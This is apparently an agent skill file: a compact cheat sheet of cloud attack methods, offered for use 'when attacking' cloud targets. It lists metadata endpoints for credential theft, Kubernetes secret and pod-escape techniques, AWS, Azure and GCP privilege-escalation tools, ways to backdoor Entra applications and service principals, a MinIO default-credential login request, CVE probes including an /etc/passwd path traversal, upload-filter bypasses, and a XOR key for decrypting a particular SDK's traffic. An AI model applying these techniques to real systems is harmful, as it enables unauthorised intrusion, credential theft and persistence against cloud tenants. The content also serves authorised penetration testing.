---
name: cloud-attack-methods
description: >-
  Cloud attacks: metadata APIs, S3/K8s, AWS/Azure/GCP identity privilege escalation, MinIO matrix, Alibaba Cloud FC, ChengZi SDK decryption. Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-exploitation.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Cloud Attack Methods

```
=== Cloud ===
Metadata APIs: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | Alibaba Cloud 100.100.100.200
Object storage: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1 to get secrets / exec into pods → cluster-admin
🚨 Cloud identity attacks (privilege escalation and lateral movement after obtaining a key/token):
  AWS: enumerate permissions with enumerate-iam / cloudfox / ScoutSuite → pacu to automatically find privesc (iam:PassRole + lambda/ec2/glue etc., 18+ paths) | STS AssumeRole across accounts | steal keys from Lambda environment variables
  Azure/Entra: roadtools (roadrecon to dump the tenant) / AADInternals | device code / refresh tokens | steal tokens from Managed Identity IMDS | Automation Runbook RCE | read secrets from Key Vault
  Entra post-exploitation: GraphRunner (Graph API enumeration / search mail / add backdoor App) | add credentials to service principals (stealthy persistence) | dynamic group abuse | PRT theft for lateral movement
  GCP: service account tokens (metadata) | serviceAccountTokenCreator / actAs privilege escalation | gcloud enumeration
🚨 Deeper K8s (after gaining cluster network/pod access): kubelet 10250 unauthenticated (/pods to list, /exec into any container) | etcd 2379 without auth reads all secrets | anonymous API Server | over-privileged SA via RBAC (kubectl auth can-i --list) | privileged pod mounting the host for escape | in cloud K8s, seize node identity → IMDS
🚨 MinIO attack matrix:
  Fingerprinting: Server: MinIO | /minio/health/live → 200 (empty body) | /minio/health/cluster → 200 | 9000 (API) + 9001 (Console)
  Console brute force: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → requires a JWT provider configuration
  CVE-2023-28432: POST /minio/health/cluster?verify (information disclosure, returns environment variables including MINIO_SECRET_KEY)
  CVE-2023-28434: path traversal /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName (unusable if patched)
  Anonymous access: GET /bucket-name/ → ListBucket (200) = anonymous read | PUT /bucket/file → AccessDenied (403) = anonymous write blocked
  Upload bypass: the application layer validates the sign parameter but not dir → can write to any bucket (sign only covers cid+et+og, not dir)
  Extension bypass: .jsp;.jpg / .jsp%00.jpg passes the application blacklist, but MinIO stores it as a static file (image/jpeg) that is not executed
🚨 Alibaba Cloud FC function (fcapp.run) enumeration:
  Identification: URL contains *.cn-{region}.fcapp.run → Alibaba Cloud Function Compute (serverless)
  Signatures: POST returns "unauthorized method 'POST'" (405) = only accepts GET | 200 + {"code":200,"msg":"Forbidden"} = path exists but a parameter is missing
  Exploitation: GET /{path}/{id}.html → 302 redirect leaks the real CDN domain + auth_key-signed URL (exposes CDN domain / bucket structure / signing algorithm)
  Enumeration: different path prefixes map to different APPs (/mkzavakx/ vs /kpqwbcoq/) | invalid ID → 302 to qzone.qq.com/404.html (fallback)
  Path traversal: FC normalizes correctly (../ is ineffective), but different function paths can be enumerated
  CDN auth_key (Kunlun CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → cracking requires privatekey | x-tengine-error reveals "denied by req auth"
  FC → CDN chain: FC function generates signed URL → download from kunlun / kijwsks.com CDN | referer spoofing as Baidu (mo.baidu.com)
🚨 ChengZi site builder (ChengZi SDK) decryption:
  Initialization: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → encrypted response (base64)
  Decryption: single-byte XOR key=0x96 → JSON (channelCode / fu download URL / csu tracking URL / ph installer package hash)
  d3504.cn is protected by Cloudflare + Alibaba Cloud DDoS protection (aliyunddos) + Kunlun CDN (kunlunaq.com) → multi-layer protection
  Key point: the fu field = the real APK download FC function URL (may be in a different region than the landing page!) | csu = click-tracking callback URL
```
